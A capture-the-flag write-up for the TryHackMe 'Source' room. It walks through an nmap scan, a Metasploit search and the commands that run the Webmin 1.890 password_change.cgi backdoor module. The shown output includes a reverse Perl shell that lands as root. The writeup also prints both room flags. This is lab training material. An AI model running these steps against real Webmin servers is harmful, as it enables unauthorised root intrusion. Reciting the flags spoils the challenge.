## Source - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/source)

<i>Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?</i>

**IP: 10.10.25.44**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Metasploit<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan.

  ```
  nmap -sC -sV -T5 -p- 10.10.25.44

  PORT      STATE    SERVICE      VERSION
  22/tcp    open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
  |   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
  |_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
  1112/tcp  filtered msql
  1698/tcp  filtered rsvp-encap-1
  8553/tcp  filtered unknown
  10000/tcp open     http         MiniServ 1.890 (Webmin httpd)
  |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
  11861/tcp filtered unknown
  18553/tcp filtered unknown
  19794/tcp filtered unknown
  20476/tcp filtered unknown
  21492/tcp filtered unknown
  27722/tcp filtered unknown
  30611/tcp filtered unknown
  34458/tcp filtered unknown
  36460/tcp filtered unknown
  46287/tcp filtered unknown
  50727/tcp filtered unknown
  64107/tcp filtered unknown
  65240/tcp filtered unknown
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- I visited the server and tried some default credentials but nothing worked, so I started Metasploit to look for some exploits before googling them manually.

---

## ⚙️ Shell Access

- Wellp, Metasploit got my back, no need for googling. There's a module that will give us backdoor access. `exploit/linux/http/webmin_backdoor`

  ```
  msfconsole

  msf6 > search webmin
  
  Matching Modules
  ================
  
     #   Name                                           Disclosure Date  Rank       Check  Description
     -   ----                                           ---------------  ----       -----  -----------
     0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
     1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
     2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
     3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
     4     \_ target: Unix In-Memory                    .                .          .      .
     5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
     6     \_ target: Linux Dropper (ARM64)             .                .          .      .
     7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
     8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
     9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
     10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
     11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
     12    \_ target: Automatic (Linux Dropper) 
  ```
  
- Set all parameters and then run it, it will give you root shell.

  ```
  msf6 exploit(linux/http/webmin_backdoor) > set lhost [YOUR-THM-IP]
  lhost => [YOUR-THM-IP]
  msf6 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.25.44
  rhosts => 10.10.25.44
  msf6 exploit(linux/http/webmin_backdoor) > set SSL true
  [!] Changing the SSL option's value may require changing RPORT!
  SSL => true
  msf6 exploit(linux/http/webmin_backdoor) > run
  
  [*] Started reverse TCP handler on [YOUR-THM-IP]:4444 
  [*] Running automatic check ("set AutoCheck false" to disable)
  [+] The target is vulnerable.
  [*] Configuring Automatic (Unix In-Memory) target
  [*] Sending cmd/unix/reverse_perl command payload
  [*] Command shell session 1 opened ([YOUR-THM-IP]:4444 -> 10.10.25.44:42180) at 2025-05-14 11:14:40 +0100
  
  shell
  [*] Trying to find binary 'python' on the target machine
  [*] Found python at /usr/bin/python
  [*] Using `python` to pop up an interactive shell
  [*] Trying to find binary 'bash' on the target machine
  [*] Found bash at /bin/bash
  
  whoami
  whoami
  root
  root@source:/usr/share/webmin/# 
  ```
  
- Since we have a shell, let's get those flags.

---

## 🧍 Flags

- Since we are already root, we have accesss to everything. Finding those flags is pretty simple.

  ```
  root@source:/usr/share/webmin/# cd
  cd
  
  root@source:~# ls 
  ls 
  root.txt
  
  root@source:~# cat root.txt
  cat root.txt
  THM{UPDATE_YOUR_INSTALL}
  
  root@source:/# cd home
  cd home
  
  root@source:/home# ls
  ls
  dark
  
  root@source:/home# cd dark
  cd dark
  
  root@source:/home/dark# ls
  ls
  user.txt  webmin_1.890_all.deb
  
  root@source:/home/dark# cat user.txt
  cat user.txt
  THM{SUPPLY_CHAIN_COMPROMISE}
  ```

---

## 🏁 Flags

- **User Flag**: `THM{SUPPLY_CHAIN_COMPROMISE}`
- **Root Flag**: `THM{UPDATE_YOUR_INSTALL}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing.`

- What did I learn?
  `Practiced Metasploit.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
